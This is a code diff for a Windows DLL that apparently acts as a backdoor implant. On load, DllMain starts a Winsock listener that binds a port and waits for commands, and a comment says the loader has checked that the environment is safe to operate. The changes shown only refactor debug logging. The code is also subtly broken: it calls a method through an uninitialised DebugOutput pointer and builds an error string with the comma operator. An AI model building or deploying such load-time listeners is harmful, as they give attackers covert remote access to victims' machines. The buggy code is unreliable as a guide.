@@ -5,7 +5,9 @@
 #include "debug.h"
 #include "dllmain.h"
 
-BOOL startListen(fstream &debugFile)
+using namespace InternalDebug;
+
+BOOL startListen(DebugOutput* debug)
 {
     WORD wsaVersion;
     WSADATA wsaData;
@@ -19,12 +21,12 @@ BOOL startListen(fstream &debugFile)
     status = WSAStartup(wsaVersion, &wsaData);
     if (status)
     {
-        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Wsastartup did not complete successfully \n");
+        debug->writeFile("ERROR: Wsastartup did not complete successfully \n", ios::app);
         string errorCode = "Error code: %u \n", status;
-        InternalDebug::DebugOutput::writeFile(debugFile,errorCode);
+        debug->writeFile(errorCode, ios::app);
         return FALSE;
     }
-    InternalDebug::DebugOutput::writeFile(debugFile, "WSAStartup was successful \n");
+    debug->writeFile("WSAStartup was successful \n", ios::app);
     std::cout << "WSAStartup was successful \n";
 
     // Information for target
@@ -40,13 +42,13 @@ BOOL startListen(fstream &debugFile)
 
     if (serverSock == INVALID_SOCKET)
     {
-        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not successfully create socket \n");
+        debug->writeFile("ERROR: Could not successfully create socket \n", ios::app);
         return FALSE;
     }
 
     if (bind(serverSock, (LPSOCKADDR)&client, sizeof(client)) == SOCKET_ERROR)
     {
-        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not bind socket \n");
+        debug->writeFile("ERROR: Could not bind socket \n", ios::app);
         return FALSE;
     }
     printf("Listening on port: %d \n", PORT_NUM);
@@ -126,34 +128,26 @@ BOOL startListen(fstream &debugFile)
 
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
+    BOOL status;
+    DebugOutput* debug;
+
+    debug = debug->createFile();
+
     switch (ul_reason_for_call)
     {
-        BOOL status;
         // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
         case DLL_PROCESS_ATTACH:
         {
             printf("Inside DLLMain... \n");
             // Pass control to our listening function and wait for user input 
-            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
-            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
-            if (!status)
-            {
-                break;
-            }
-            status = startListen(debugFile);
+            status = startListen(debug);
             printf("Finished actions in process attach, exiting... \n");
             break;
         }
         case DLL_THREAD_ATTACH:
         {
             // Pass control to our listening function and wait for user input 
-            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
-            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
-            if (!status)
-            {
-                break;
-            }
-            status = startListen(debugFile);
+            status = startListen(debug);
             break;
         }
         case DLL_THREAD_DETACH:
